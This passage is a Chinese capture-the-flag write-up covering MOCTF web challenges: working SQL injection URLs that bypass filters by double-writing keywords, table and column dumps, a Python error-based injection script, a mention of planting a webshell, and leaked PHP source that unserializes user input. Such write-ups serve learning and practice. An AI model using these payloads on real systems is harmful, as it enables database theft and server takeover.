class="string">&#x27;body&#x27;</span>).<span class="title function_">append</span>(form);</span><br><span class="line">                       form.<span class="title function_">submit</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         &#125;</span><br><span class="line">       &#125;);</span><br><span class="line">   &#125;);</span><br><span class="line"> &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>看一下请求,get一个clicks=108000</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6003/web1/?clicks=108000</span><br></pre></td></tr></table></figure><p>拿到flag:moctf{Here_Is_Your_Surprise}</p><h3 id="ez-injection">ez Injection</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1</span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;尊敬的:saltyfish您本次恭喜您本次比赛荣获第:1名&lt;/b&gt;&lt;/br&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure><p>随意测试一下发现空格被过滤,注释绕过,sky大神用的%0a绕,差不多</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/order/**/by/**/4%23</span><br></pre></td></tr></table></figure><p>无返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/order/**/by/**/3%23</span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;尊敬的:saltyfish您本次恭喜您本次比赛荣获第:1名&lt;/b&gt;&lt;/br&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure><p>发现提取的三列 然后尝试用union select</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/union/**/select/**/1,2,3%23</span><br></pre></td></tr></table></figure><p>发现没有返回... 这个时候我就傻逼了...不知道怎么做,看了大神的wp之后... 大神随手一个双写就绕过去了.. 大神的想法是..可能union和select被过滤了 那么访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/union%23</span><br></pre></td></tr></table></figure><p>应该是返回正常的 我自己去尝试了一下,发现确实正常,那么为什么是把union替换为了空呐? 我自己又去尝试了一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/1%23</span><br></pre></td></tr></table></figure><p>发现返回的是空,那么前面的那个应该是把union替换为了空,所以双写可以绕过的,应该是这个逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:120.78.57.208:6002/?id=1%27/**/ununionion/**/selselectect/**/1,2,3%23</span><br></pre></td></tr></table></figure><p>得到返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;尊敬的:saltyfish您本次恭喜您本次比赛荣获第:1名&lt;/b&gt;&lt;/br&gt;&lt;b&gt;尊敬的:2您本次恭喜您本次比赛荣获第:1名&lt;/b&gt;&lt;/br&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure><p>然后测试的时候发现括号被过滤了,但是影响不大,直接提取就好了 然后去访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:120.78.57.208:6002/?id=1&#x27;/**/ununionion/**/selselectect/**/1,table_name,3/**/from/**/information_schema.tables%23</span><br></pre></td></tr></table></figure><p>发现又没有返回了,多的单词只有table_name,from,information,schema,一个一个测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/information%23</span><br></pre></td></tr></table></figure><p>后面的information换成table,name,schema都返回空,说明没被过滤,但是from返回正常,那么双写from,提取成功,直接提取出了所有表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">尊敬的:saltyfish您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:CHARACTER_SETS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:COLLATIONS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:COLLATION_CHARACTER_SET_APPLICABILITY您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:COLUMNS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:COLUMN_PRIVILEGES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:ENGINES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:EVENTS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:FILES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:GLOBAL_STATUS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:GLOBAL_VARIABLES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:KEY_COLUMN_USAGE您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:PARAMETERS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:PARTITIONS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:PLUGINS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:PROCESSLIST您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:PROFILING您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:REFERENTIAL_CONSTRAINTS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:ROUTINES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:SCHEMATA您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:SCHEMA_PRIVILEGES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:SESSION_STATUS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:SESSION_VARIABLES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:STATISTICS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:TABLES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:TABLESPACES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:TABLE_CONSTRAINTS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:TABLE_PRIVILEGES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:TRIGGERS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:USER_PRIVILEGES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:VIEWS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:INNODB_BUFFER_PAGE您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:INNODB_TRX您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:INNODB_BUFFER_POOL_STATS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:INNODB_LOCK_WAITS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:INNODB_CMPMEM您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:INNODB_CMP您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:INNODB_LOCKS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:INNODB_CMPMEM_RESET您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:INNODB_CMP_RESET您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:INNODB_BUFFER_PAGE_LRU您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:columns_priv您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:db您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:event您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:func您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:general_log您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:help_category您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:help_keyword您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:help_relation您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:help_topic您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:host您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:ndb_binlog_index您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:plugin您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:proc您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:procs_priv您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:proxies_priv您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:servers您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:slow_log您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:tables_priv您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:time_zone您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:time_zone_leap_second您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:time_zone_name您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:time_zone_transition您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:time_zone_transition_type您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:user您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:cond_instances您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:events_waits_current您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:events_waits_history您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:events_waits_history_long您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:events_waits_summary_by_instance您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:events_waits_summary_by_thread_by_event_name您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:events_waits_summary_global_by_event_name您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:file_instances您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:file_summary_by_event_name您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:file_summary_by_instance您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:mutex_instances您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:performance_timers您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:rwlock_instances您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:setup_consumers您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:setup_instruments您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:setup_timers您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:threads您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:04ad5938eaf0efb6您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:qqflycar您本次恭喜您本次比赛荣获第:1名</span><br></pre></td></tr></table></figure><p>发现倒数第二个比较奇怪,那么继续提取 提取的时候发现where被过滤,双写绕</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/ununionion/**/selselectect/**/1,column_name,3/**/frfromom/**/information_schema.columns/**/whwhereere/**/table_name=%2204ad5938eaf0efb6%22%23</span><br></pre></td></tr></table></figure><p>这里双引号没被过滤,直接用名字上了,过滤了的话可以0x+十六进制绕过 返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">尊敬的:saltyfish您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:name您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:value您本次恭喜您本次比赛荣获第:1名</span><br></pre></td></tr></table></figure><p>继续提value</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/ununionion/**/selselectect/**/1,value,3/**/frfromom/**/04ad5938eaf0efb6%23</span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">尊敬的:saltyfish您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:moctf&#123;5o_easy_inj3cTi0n&#125;您本次恭喜您本次比赛荣获第:1名</span><br></pre></td></tr></table></figure><p>flag:moctf{5o_easy_inj3cTi0n}</p><h3 id="要认真">要认真</h3><p>发现一个后台登录界面,继续找一找,发现一个url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://119.29.170.143:6003/list.php?id=23</span><br></pre></td></tr></table></figure><p>然后测试一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://119.29.170.143:6003/list.php?id=23^0</span><br><span class="line">http://119.29.170.143:6003/list.php?id=23^1</span><br></pre></td></tr></table></figure><p>发现返回不一样 大神是盲注,但是我盲注的时候出了点问题,这个地方卡了好久... 这个地方过滤掉了等于号和where,但是可以报错注入,所以我是报错注入做的,注意闭合它的括号 其次注意报错注入每次只能提取32个字符,所以一次一次提取,最后一次的结果已经无所谓了,因为有用的已经提出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment">#list1=[&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;,&#x27;, &#x27;_&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    r=requests.get(<span class="string">&quot;http://119.29.170.143:6003/list.php?id=23)%20and%20extractvalue(1,concat(0x3a,substr((select%20group_concat(table_name)%20from%20information_schema.tables),&quot;</span>+<span class="built_in">str</span>(<span class="number">1</span>+num*<span class="number">31</span>)+<span class="string">&quot;,31)))%23&quot;</span>)</span><br><span class="line">    res = re.findall(<span class="string">r&quot;XPATH syntax error: &#x27;:([^&#x27;]+)&#x27;&quot;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(res,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TABLESPACES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,INNODB_BUFFER_PAGE,INNODB_TRX,INNODB_BUFFER_POOL_STATS,INNODB_LOCK_WAITS,INNODB_CMPMEM,INNODB_CMP,INNODB_LOCKS,INNODB_CMPMEM_RESET,INNODB_CMP_RESET,INNODB_BUFFER_PAGE_LRU,cms_article,cms_category,cms_file,cms_friendlink,cms_message,cms_notice,cms_page,cms_users,columns_priv,db,event,func,general_log,help_category,help_keyword,help_relation,help_topic,host,ndb_binlog_index,plugin,proc,procs_priv,proxies_priv,servers,slow_log,tables_priv,time_zone,time_zone_leap_second,time_zone_name,time_zone_transition,time_zone_transition_type,user,cond_instances,events_waits_current,events_waits_history,events_waits_history_long</span><br></pre></td></tr></table></figure><p>后面可能还会有,但是因为不足32个字符,爆了错,这里我就不管了,因为有用的cms_users已经出来了,继续注入爆列,得到了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CHARACTER_SET_NAME,DEFAULT_COLLATE_NAME,DESCRIPTION,MAXLEN,COLLATION_NAME,CHARACTER_SET_NAME,ID,IS_DEFAULT,IS_COMPILED,SORTLEN,COLLATION_NAME,CHARACTER_SET_NAME,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,ORDINAL_POSITION,COLUMN_DEFAULT,IS_NULLABLE,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH,CHARACTER_OCTET_LENGTH,NUMERIC_PRECISION,NUMERIC_SCALE,CHARACTER_SET_NAME,COLLATION_NAME,COLUMN_TYPE,COLUMN_KEY,EXTRA,PRIVILEGES,COLUMN_COMMENT,GRANTEE,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,PRIVILEGE_TYPE,IS_GRANTABLE,ENGINE,SUPPORT,COMMENT,TRANSACTIONS,XA,SAVEPOINTS,EVENT_CATALOG,EVENT_SCHEMA,EVENT_NAME,DEFINER,TIME_ZONE,EVENT_BODY,EVENT_DEFINITION,EVENT_TYPE,EXECUTE_AT,INTERVAL_VALUE,INTERVAL_FIELD,SQL_MODE,STARTS,ENDS,STATUS,ON_COMPLETION,CREATED,LAST_ALTERED,LAST_EXECUTED,EVENT_COMMENT,ORIGINATOR,CHARACTER_SET_CLIENT,COLLATION_CONNECTION,DATABASE_COLLATION,FILE_ID,FILE_NAME,FILE_TYPE,TABLESPACE_NAME,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,LOGFILE_GROUP_NAME,LOGFILE_GROUP_NUMBER,ENGINE,FULLTEXT_KEYS,DELETED_ROWS</span><br></pre></td></tr></table></figure><p>这里其实很迷,因为应该提取出一个username和password列才对..但是没有,后来我直接提取username和password拿到密码,然后到后台登录,传马+nginx解析漏洞,拿到webshell,然后因为数据库不在这个网站,所以我也连了一下数据库,然后提一下,也没有提取出username和password列,后续研究研究再说吧... flag:moctf{Y0u_need_to_b3_ser1ous}</p><h3 id="pubg">PUBG</h3><p>首先index.php.bak源码泄漏</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;MOCTF吃鸡大赛&lt;/title&gt;</span><br><span class="line">&lt;style type=<span class="string">&quot;text/css&quot;</span>&gt; </span><br><span class="line">a&#123; </span><br><span class="line">    text-decoration:none;</span><br><span class="line">    color:white;</span><br><span class="line">&#125; </span><br><span class="line">body</span><br><span class="line">&#123;</span><br><span class="line">    background:<span class="title function_ invoke__">url</span>(<span class="string">&#x27;image/PUBG.jpg&#x27;</span>);</span><br><span class="line">    background-attachment:fixed;</span><br><span class="line">    background-repeat:no-repeat;</span><br><span class="line">    background-size:cover;</span><br><span class="line">    -moz-background-size:cover;</span><br><span class="line">    -webkit-background-size:cover;</span><br><span class="line">&#125;</span><br><span class="line">center</span><br><span class="line">&#123;</span><br><span class="line">    color:white;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;p&gt;你现在正在飞机上,请选择要跳的地方&lt;/p&gt;&lt;/br&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=<span class="string">&quot;?LandIn=airport&quot;</span>&gt;机场&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=<span class="string">&quot;?LandIn=school&quot;</span>&gt;学校&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=<span class="string">&quot;?LandIn=field&quot;</span>&gt;打野&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=<span class="string">&quot;?LandIn=AFK&quot;</span>&gt;上个厕所&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$_GET</span>)&amp;&amp;<span class="title function_ invoke__">count</span>(<span class="variable">$_GET</span>)&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;LandIn&quot;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$pos</span>=<span class="variable">$_GET</span>[<span class="string">&quot;LandIn&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$pos</span>===<span class="string">&quot;airport&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;机场大仙太多,你被打死了~&lt;/center&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(<span class="variable">$pos</span>===<span class="string">&quot;school&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;&lt;/br&gt;&lt;center&gt;&lt;a href=&quot;/index.html&quot;  style=&quot;color:white&quot;&gt;叫我校霸~~&lt;/a&gt;&lt;/center&gt;&#x27;</span>);</span><br><span class="line">            <span class="variable">$pubg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pubg&#x27;</span>];</span><br><span class="line">            <span class="variable">$p</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$pubg</span>);</span><br><span class="line">            <span class="comment">// $p-&gt;Get_air_drops($p-&gt;weapon,$p-&gt;bag);</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(<span class="variable">$pos</span>===<span class="string">&quot;AFK&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;由于你长时间没动,掉到海里淹死了~&lt;/center&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;You Lose&lt;/center&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后去搞class.php源码,发现class.php.bak泄漏</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 